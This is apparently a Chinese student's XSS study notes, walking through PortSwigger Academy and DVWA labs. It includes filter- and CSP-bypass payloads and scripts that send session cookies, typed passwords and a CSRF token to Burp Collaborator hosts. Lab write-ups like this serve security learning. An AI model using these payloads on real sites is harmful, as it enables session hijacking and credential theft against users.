### 1.概述

通过页面内嵌的Javascript脚本，当浏览器打开该页面时执行该恶意代码达到攻击目的。先看一个简单的demo：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051865.png)

很明显可以通过搜索框注入一些js语句，F12查看前端代码：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051866.png)

很明显搜索框输入的东西会被放进<h1> </h1>中解析，那就可以通过嵌套script标签来注入js脚本。

（<h1> </h1>标签在html语言中用来命名标题。）

```js
<script>alert(1)</script>
```

这里通过script标签定义脚本（js)，alert()函数使网站弹出界面，括号内包含弹出的内容。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051867.png)



### 2.分类

#### 2.1 反射型XSS

通过一个包含恶意代码的URL让被攻击者在访问时将包含恶意代码的网站执行。比如上面的demo就是反射型xss，实际攻击时只需要复制url即可达到相同的效果：

```
https://0a910001040ab70ac0000baa00780041.web-security-academy.net/
?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

#### 2.2 存储型XSS

相比于反射型XSS，存储型XSS会将输入的恶意代码经过后端 数据库等中间件后存储，再被二次调用。

```
https://0af000f6049705e3c4875f6a00bd000f.web-security-academy.net/post?postId=7
这种类似于博客留言框上传恶意代码的比较常见
```

#### 2.3 DOM XSS

相比于前两种，DOM XSS不经过后端，代码也不和后端产生交互，而只使用前端代码中的漏洞进行恶意脚本注入。

DOM,即文档对象模型，是一种和平台/语言无关的API，可以将web页面和脚本，编程语言连接起来（这其中就包括但不限于javascript）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051868.png)

不通过后端直接运用js引擎在前端解析的方式被称为DOM EVENTS：

```
https://www.w3schools.com/jsref/dom_obj_event.asp
```

### 3.技巧

#### 3.1 Payload合集

PortSwigger的payload合集：

```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```

#### 3.2 自定义标签

在有些包含XSS注入的后端代码中，大多数特定的标签会被过滤，这个时候可以通过自定义标签来绕过这类限制：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051869.png)

这里的payload是，可以达到让后端引擎正确解析onclick事件的效果:

```
<abc onclick="alert(1)">abc</abc>
```

参考：https://blog.csdn.net/angry_program/article/details/106267437

#### 3.3 拓展资料

基于AngularJS的XSS漏洞：https://zhuanlan.zhihu.com/p/56043248

（AngularJS的ng-app语法：https://www.runoob.com/angularjs/ng-ng-app.html）

Burpsuite Collaborator使用指南：

https://cloud.tencent.com/developer/article/1928550

https://blog.csdn.net/wang_624/article/details/123172519

https://blog.csdn.net/m0_37268841/article/details/102465521

### 4.练习

#### 4.1PortSwigger Lab

##### 4.1.1DOM XSS in document.write sink using source location.search

解题过程：仍然在搜索框中随便输入字符，跳转后F12审计网页元素，Ctrl+F搜索输入的字符。发现该网页把输入的字符进行了转义处理，变成了图像。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051870.png)

img为图像专用标签，src标签表示地址，src="。。。"内部为图像地址。

可以注入后引号提前闭合img src标签，再在之后添加恶意代码:

```
"><svg onload=alert(1)>
```

此时变为

```
<img src ="xxx"><svg onload=alert(1)>
```

##### 4.1.2 Reflected XSS with some SVG markup allowed

这题也顺便mark一下BurpIntruder的使用方法：

当使用常见的payload时，发现tag isn't allowed;自定义标签也不被允许：

```
<img src=1 onerror=alert(1)>
<abc onerror=alert(1)>abc</abc>
```

Burpsuite抓包后send to intruder.在?search=之后添加“<§§>"作为payload位置，将cheat tags作为字典放入Payload Options,进行sniper攻击：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051871.png)

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051872.png)

发现有以下四个tag没有被过滤。

SVG：矢量图标签，基于XML语言标准绘制的图形，其特点是可以无限放大而不修改分辨率。

Animatetransform：也和矢量图有关，通过该标签改变以svg为标签的图像的属性，从而允许svg矢量图通过动画控制平移，缩放，旋转，倾斜等。

构造如下payload并遍历events进行sniper攻击：

```
<svg><animatetransform%20§§=1>
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051873.png)

发现只有event为onbegin时回显正常为200，说明该event没有被后端过滤。

则最终Payload为：

```
<svg><animatetransform onbegin=alert(1)>
```

##### 4.1.3 DOM XSS in jQuery anchor href attribute sink using location.search source

*href标签：指定一个链接，然后使浏览器客户端跳转到该链接。

```html
<a href = "URL">(xxxx </a>)
```

在Submit Feedback界面。可以发现网站的链接比较特殊，存在可能的XSS注入点：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051874.png)

在returnPath之后随便加点东西，比如abc。很明显这个随机字符串会被写入到这个网站前端代码的某一部分（ReturnPath）中。所以可以在审查元素搜索刚才的随机字符串：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051875.png)

href标签可以指定任意链接/js脚本，所以可以将ReturnPath的键值改为弹窗脚本：javascript:alert(xxx)。触发方式就是通过点击Back按钮。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051876.png)

##### 4.1.4 DOM XSS in jQuery selector sink using a hashchange event

*jQuery selector:即jQuery 选择器，该功能可以通过操作URL选择不同的HTML元素。

```html
$("p") //元素选择
$("#test") //通过特定的id属性查找元素
$(".test") //通过特定的类名查找元素
Hint ： https://www.w3schools.com/jquery/jquery_selectors.asp
```

PortSwigger Academy的网站URL结构比较简单，可以由此下手进行发包攻击（该题提供了基于网页端的exploit server。Burpsuite也是可以的）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051877.png)

解析一下Payload的结构：

```
# 通过id属性查找元素
onload = "xxx" 引号内可以是任意的javascript功能。onload的作用是在目标网页一被加载时就执行其包含的脚本
</iframe> : 指定一个内联框架，可以在HTML网页中内嵌一个文档（该文档也可以是HTML/is等编写的）
this.src : 选定当前的HTML元素，这里是上面已经加载好的URL链接
onerror ： 加载外部文件（例如文档或图像）时发生错误，则会触发 onerror 事件 由于这里前面的img src = x其实指定了一个不存在的图片链接，所以在加载时就会保存 从而弹窗。而print的弹窗则负责弹出iframe的框架，在新的页面上显示一个啥都没有的框，同时弹出打印该网页HTML内容的请求。
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051878.png)



##### 4.1.5 Stored XSS into anchor `href` attribute with double quotes HTML-encoded

这道题也是一个比较常见的双层的存储型XSS，攻击点在于发送评论（数据包）后在查看时后端返回了以提交表单中website为URL后缀内容的数据包，因此可以通过在数据包中添加脚本进行攻击。

正常的数据包内容如下：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051879.png)

当在前端显示出评论链接并点击后，数据包如下：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051880.png)

可以发现定位方式就是website项的数据，而且直接返回在URL中且无编码，所以在website一栏内直接填入payload即可。

##### 4.1.6 Reflected XSS into a JavaScript string with angle brackets HTML encoded

这题展示了简单的js脚本闭合技巧（~~死去的sql记忆开始攻击我~~）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051881.png)

可见这里搜索框内的字符串被单引号包含之后写入到变量searchTerms，则只需要在字符串输入时先输入单引号则可以让单引号两两闭合。由于这一段代码包含于<script>内，所以可以让js代码直接被执行。

##### 4.1.7 DOM XSS in `document.write` sink using source `location.search` inside a select element

这里也有一个技巧：对于在URL内直接出现某变量等于某个值的结构，一般可能存在XSS注入。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051882.png)

注意到右下角的store变量使用的是location.search先获取URL中的查询部分，即：“？”之后的字符串，然后传入storeId变量，然后用documen.write写入包含storeId的标签。

而点击页面下方的check stock抓包，提交的字符串为：

```
productId=1&storeId=London
```

由于storeId被直接传入URL，则可以通过该漏洞编辑payload：

```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

##### 4.1.8 Exploiting cross-site scripting to steal cookies/passwords

这里介绍了一个相当强大的功能：Burpsuite Collaborator。它的作用简略来说就是通过建立一个中继服务器用来在靶机和BURPSUITE之间存储和重放目标。很容易就可以发现这种中继方式在面对类似无回显的SQL盲注和XSS提权等漏洞时相当高效。

参考文档：

https://cloud.tencent.com/developer/article/1928550

https://blog.csdn.net/wang_624/article/details/123172519

https://blog.csdn.net/m0_37268841/article/details/102465521

以该题为例简单记录Collaborator在XSS攻击中的使用流程。

在Comment文本框内输入以下命令：

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

CORS机制详解：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS

提交之后在Collaborator界面点击poll now，则会发现开始成功有数据包回传。点开任意一个HTTP数据包，可以看到session cookie值已经回显：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051883.png)

前面的学习已经提及了session的作用：存储在服务器端的一个字符串，与cookie对应，分别在服务器端和浏览器端验证浏览器端的身份。现在由于已经掌握了session，则在任意一个链接抓包，将session值替换为抓包得到的session值，则可成功以管理员身份进入网页。

获取管理员密码也是可行的，需要修改一下提交的js脚本。

```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

##### 4.1.9 Reflected XSS into HTML context with all tags blocked except custom ones

当常用的payload都不可用的时候就可以尝试自定义tag进行XSS攻击：

```javascript
?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';
//该payload生成了一个名为X的自定义标签，通过onfocus事件进行alert操作并生成一个弹窗放置标签x
```

```javascript
?'accesskey='x'onclick='alert(1)
//把X作为一个全局热键，当X被按动时触发alert事件
```

##### 4.1.10 Reflected XSS with event handlers and `href` attributes blocked

当之前常见的通过事件和标签嵌套被禁用的时候，可以人为添加一个假链接，辅以诱导性的标题进行XSS攻击（可能有些类似于ClickJacking)

```javascript
/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>
//attributeName：http://www.verydoc.net/svg/00007430.html
```

这相当于在页面中直接插入了一个含有click me的文本框超链接，点击后则会执行alert代码。

##### 4.1.11 Reflected XSS in a JavaScript URL with some characters blocked

当javascript指令无法执行的时候，可以通过构造代码错误并将其发送到错误处理器（Exception Handler）的方式构造XSS攻击。

```
post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

需要注意的是该题中屏蔽了空格，所以throw语句和它“抛出”的错误之间使用了/**/分割。由于throw语句不可以直接在URL中被解析，所以需要使用toString方法强制在window弹窗中加载语句。

##### 4.1.12 反射型XSS与CSP bypass

#CSP Intro:https://portswigger.net/web-security/cross-site-scripting/content-security-policy

审计页面代码，发现My account =>Change Email可能存在XSS注入。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051884.png)

随便输入一个网址，发现输入的"email"和附带的CSRF被一起传入后端：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051885.png)

由于CSRF存在，如果要对网站进行XSS注入，则必须获取与email相对应的CSRF值。构造脚本：

```javascript
<script>
if(window.name) {
		new Image().src='//gsc9g31vnpe66qug03nb584ef5lw9l.burpcollaborator.net?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://0a12009a031e506780d50375000f0077.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0ab10084031450a4808802b701ac00fa.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
//该脚本的作用是：绘制一个图片，带有文字Click me,诱导用户将自身的CSRF信息发送给collaborator服务器
```

#Window.name:https://blog.csdn.net/qq572069832/article/details/109751956

发送该exploit至源服务器，则Collaborator可以回显HTTP的交互包。注意到交互包内事实上返回了我们需要的CSRF值：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051886.png)

获取到需要的CSRF token之后，重新发包拦截，在包内把email改为将邮件导向的恶意地址，并重新生成CSRF PoC，该自动发包需要打开Options中的自动提交脚本：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051887.png)

生成PoC之后复制PoC进入Expoloit server并提交。这种通过第三方服务器获取用户敏感信息（一般用于有CSP保护且存在CSRF等类似令牌规则的网站）的方式被称为Dangling Markup Attack.https://blog.csdn.net/angry_program/article/details/106441323

CSP bypass也可以使用其它方法：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051888.png)

在此题中发现img标签闭合是被正常解析的，但是由于CSP本地规则导致内部的js命令无法被执行。

查看Network中的该链接，可以发现该站点的本地CSP规则：

```
content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

在存在**script-src 'self'**时，即可通过script标签进行CSP Bypass.相对应的，在存在**img-src 'self'**时，可以通过图片标签进行CSP Bypass

值得注意的是，一般只在网站开启了同源规则时，即脚本，图片，标签等元素只能在同域时才能正常解析，才会考虑使用CSP bypass。

在这道题中，注意到本地CSP规则中有一行：

```
report-uri /csp-report?token=
```

=之后并没有任何安全的闭合措施，所以可以通过控制CSP中的token对本地CSP策略写入恶意命令：

```js
https://0aa600ba0407e4c584bffe070059008d.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
https://0aa600ba0407e4c584bffe070059008d.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

通过提前闭合token字段，直接将**script-src-elem 'unsafe-inline'**规则传入CSP，即允许不安全的域内js脚本。后端接收到的信息如下：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051889.png)

#### 4.2 DVWA-CSP

在题目之前重申一次CSP Bypass的目的：通过在url或其他输入域添加本地CSP规则，使后端可以解析未知来源的javascript文件.

CSP标准文档：https://content-security-policy.com/

启用CSP的两种方式：HTTP响应头中的Content-Security-Policy；通过网页标签

```php
//网页标签启用CSP
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
```

##### 4.2.1 CSP-LOW

观察源代码中的CSP部分：

```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.
header($headerCSP);
?>
//可以从CSP规则中指定的网站作为输入域添加javascript
```

##### 4.2.2 CSP-MEDIUM

Burpsuite抓包，发现回显中的CSP有两个值得注意的点：

```js
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
//unsafe-inline:Allows use of inline source elements such as style attribute, onclick, or script tag bodies (depends on the context of the source it is applied to) and javascript: URIs；即允许使用onclick等事件脚本函数
//nonce：Allows an inline script or CSS to execute if the script (eg: <script nonce="rAnd0m">) tag contains a nonce attribute matching the nonce specifed in the CSP header. The nonce should be a secure random string, and should not be reused.只有满足nonce值与CSP规则中相同，才可以执行对应的Js代码
```

本题中的Nonce是一个固定字符串，故只需要在payload中添加该nonce即可成功执行:

```js
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051890.png)

##### 4.2.3 CSP-HIGH

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051891.png)

本题已经没有输入框可以执行代码了，根据提示打开源代码php文件：

```php
<?php
header("Content-Type: application/json; charset=UTF-8");

if (array_key_exists ("callback", $_GET)) {
    $callback = $_GET['callback'];
} else {
    return "";
}

$outp = array ("answer" => "15");
# callback 可以被控制
echo $callback . "(".json_encode($outp).")";
?>
//----------------------------------------------------------------------------------//
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

function solveSum(obj) {
	if ("answer" in obj) {
		document.getElementById("answer").innerHTML = obj['answer'];
	}
}

var solve_button = document.getElementById ("solve");

if (solve_button) {
	solve_button.addEventListener("click", function() {
		clickButton();
	});
}
```

clickButton函数首先生成一个script标签，来源指向callback=solveNum,并且放置在前端DOM内。那么在前端点击按钮时，clickButton就会调用solvenum函数并返回到callback变量中，同时clickButton也一直被监听。solveNum函数会获取answer中的内嵌内容，所以script标签将会把solveSum({"answer":"15"})当成js函数执行并在适当的位置回显。显然这里的callback可以被script标签中的src随意定义。则PAYLOAD为：

```js
<script src="source/jsonp.php?callback=alert('hacked');"></script>
```

命令注入：https://weakptr.site/p/get-start-dvwa-12/

#### 4.3 DVWA-XSS

##### 4.3.1 DOM-MEDIUM

源码中过滤了script标签，当识别到script标签时会自动跳转到English:

```php
if (stripos ($default, "<script") !== false) {
	header ("location: ?default=English");
	exit;
}
```

尝试使用img src闭合，发现不成功，观察源码，发现需要闭合之前的option与select标签才能让payload执行：

```html
http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=</option></select><img src=1 onerror=alert(1);>
```

##### 4.3.2 DOM-HIGH

源码中使用了白名单，通过switch选择语句使后端只接受四个已有的选项：

```php
	# White list the allowable languages
	switch ($_GET['default']) {
		case "French":
		case "English":
		case "German":
		case "Spanish":
			# ok
			break;
		default:
			header ("location: ?default=English");
			exit;
	}
```

对于DOM XSS，遇到这类后端严格控制的情况，则需要绕过后端直接在前端/客户机本地执行代码：可以通过在js payload前添加#的方式使js代码被后端URL过滤掉而只在前端被执行

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051892.png)

##### 4.3.3 REFLECTED-HIGH

源码中使用了正则表达式的搜索替换，直接过滤了带有<script>的部分。

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Get input
	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

	// Feedback for end user
	$html .= "<pre>Hello {$name}</pre>";
}
```

只需要使用img src标签或onclick等其他标签即可正常回显：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202308021051893.png)

##### 4.3.4 REFLECTED-IMPOSSIBLE

源码：

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$name = htmlspecialchars( $_GET[ 'name' ] );

	// Feedback for end user
	$html .= "<pre>Hello {$name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

**checkToken()**中同时检查了token和session，对应了客户端和网页后端，杜绝了CSRF攻击的可能，**htmlspecialchars()**函数把输入的网址实体化为html元素，不会被任何语言解析。



